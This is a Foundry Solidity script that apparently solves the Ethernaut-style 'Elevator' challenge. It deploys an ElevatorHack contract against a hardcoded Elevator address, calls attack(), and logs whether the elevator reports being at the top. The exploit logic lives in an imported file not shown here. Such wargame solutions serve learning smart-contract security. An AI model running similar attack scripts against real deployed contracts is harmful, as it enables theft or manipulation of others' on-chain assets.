// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Elevator.sol";
import "../src/ElevatorHack.sol";

contract ElevatorHackScript is Script {
  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    address elevatorAddress = payable(address(0xF71b2ef0a13d3C6FeDd6257BA76f995a1C5f1Faf));
    Elevator elevatorContract = Elevator(elevatorAddress);

    vm.startBroadcast(attackerPrivateKey);
    console.log("we should not be at the top");
    console.log(elevatorContract.top());

    ElevatorHack elevatorHackContract = new ElevatorHack(elevatorAddress);

    elevatorHackContract.attack();
    console.log("we should be at the top now");
    console.log(elevatorContract.top());

    vm.stopBroadcast();
  }
}